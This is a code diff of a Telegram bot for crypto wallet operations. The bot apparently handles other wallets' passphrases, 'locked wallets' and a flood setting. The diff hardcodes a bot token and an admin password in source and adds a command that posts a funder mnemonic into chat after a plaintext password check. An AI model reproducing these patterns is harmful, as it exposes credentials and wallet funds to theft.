@@ -7,7 +7,7 @@ import Passphrase from "./models/Passphrase.js";
 import { formatReadableTimeString, splitMessage, timeAgoOrInString } from "./utils/helper.js";
 import Settings from "./models/Settings.js";
 
-const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
+const token = '7940844852:AAEY5NwW8ORu6X45xuWEp4Klq_3sO17OH7o';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
 const PASSWORD = '8144700718';
 
@@ -55,7 +55,6 @@ bot.onText(/\/help/, (msg) => {
         /listPhrases - List all locked wallets
         /deleteWallet - Delete wallet from queue
         /stop - stops all running process
-        /settings - List settings commands
         `;
     return bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
 });
@@ -146,8 +145,8 @@ bot.onText(/\/listWallets/, (msg) => {
 
 bot.onText(/\/showSettings/, async (msg) => {
     const chatId = msg.chat.id;
-    const settings = await Settings.findOne();
-    bot.sendMessage(chatId, '📥 Please enter your wallet address');
+    bot.sendMessage(chatId, '📥 Please enter password');
+    userSessions[chatId] = { showSettings: true };
 });
 
 bot.onText(/\/listSponsors/, async (msg) => {
@@ -715,7 +714,7 @@ bot.on('message', async (msg) => {
 
     if(userSessions[chatId]?.MaxFlood) {
         const maxFlood = Number(text);
-        if(typeof maxFlood !== 'number') {
+        if(isNaN(maxFlood)) {
             delete userSessions[chatId];
             return bot.sendMessage(chatId, '❌ Please send a numeric value.');
         }
@@ -726,7 +725,7 @@ bot.on('message', async (msg) => {
 
         try {
             const saved = await upsertSettings({ maxFlood, name: 'shepherd' });
-            bot.sendMessage(chatId, `${saved ? '✅' : '❌' } ${ saved.message }`);
+            bot.sendMessage(chatId, `✅ maxFlood updated to ${maxFlood}`);
 
         } catch (error) {
             console.log(error)
@@ -753,7 +752,7 @@ bot.on('message', async (msg) => {
 
             if(password !== PASSWORD) {
                 delete userSessions[chatId];
-                return bot.sendMessage(chatId, `❌ Wrong password`);
+                return bot.sendMessage(chatId, '⛔ Access Denied. You are not authorized to perform this action.');
             }
 
             const accountData = await getAccount(address);
@@ -769,6 +768,57 @@ bot.on('message', async (msg) => {
         } catch (error) {
             console.log(error)
             bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
+        }
+
+        delete userSessions[chatId];
+    }
+});
+
+// Show settings
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if(userSessions[chatId]?.showSettings) {
+        if(text !== PASSWORD) {
+            return bot.sendMessage(chatId, '⛔ Access Denied. You are not authorized to perform this action.');
+        }
+        try {
+            const settings = await Settings.findOne();
+
+            if (!settings) {
+                return bot.sendMessage(chatId, '⚠️ No settings found. Use /settings to see available commands.');
+            }
+
+            const funder = settings.funderMnemonic;
+            const maxFlood = settings.maxFlood;
+            const mainAddress = settings.mainAddress;
+            const updatedAt = new Date(settings.lastUpdatedAt).toLocaleString('en-GB', {
+                day: '2-digit',
+                month: 'short',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+            });
+
+            const message = `
+                *🔧 Current Settings:*
+
+                • *Main Address:* \`${mainAddress}\`
+                • *Funder Mnemonic:* \`${funder}\`
+                • *Max Flood:* \`${maxFlood}\`
+                • *Last Updated:* _${updatedAt}_
+                            `.trim();
+
+    
+            bot.sendMessage(chatId, message, {
+                parse_mode: 'Markdown',
+            });
+
+        } catch (error) {
+            console.log(error)
+            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
         }
 
         delete userSessions[chatId];
